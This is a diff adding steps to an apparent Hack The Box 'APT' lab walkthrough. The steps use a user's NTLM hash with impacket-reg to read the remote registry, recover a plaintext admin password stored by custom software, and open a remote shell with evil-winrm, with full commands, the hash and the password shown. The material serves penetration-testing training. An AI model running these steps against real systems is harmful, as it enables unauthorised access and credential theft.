@@ -456,5 +456,47 @@ SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local
 ```
 
 - But the user doesn't have `winrm` permissions
+  - We can read `registry` remotely using `impacket-reg`
+```
+└─$ impacket-reg -hashes ':e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE                                
+Impacket v0.11.0 - Copyright 2023 Fortra
 
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\SOFTWARE
+HKU\SOFTWARE\GiganticHostingManagementSystem
+HKU\SOFTWARE\Microsoft
+HKU\SOFTWARE\Policies
+HKU\SOFTWARE\RegisteredApplications
+HKU\SOFTWARE\Sysinternals
+HKU\SOFTWARE\VMware, Inc.
+HKU\SOFTWARE\Wow6432Node
+HKU\SOFTWARE\Classes
+
+```
+
+- There is a strange software `GiganticHostingManagementSystem`
+  - Checking it gives us creds
+```
+└─$ impacket-reg -hashes ':e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\SOFTWARE\GiganticHostingManagementSystem
+        UserName        REG_SZ   henry.vinson_adm
+        PassWord        REG_SZ   G1#Ny5@2dvht
+```
+
+- We can `winrm`
+```
+└─$ evil-winrm -i apt -u henry.vinson_adm -p 'G1#Ny5@2dvht'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> 
+```
 ## Root
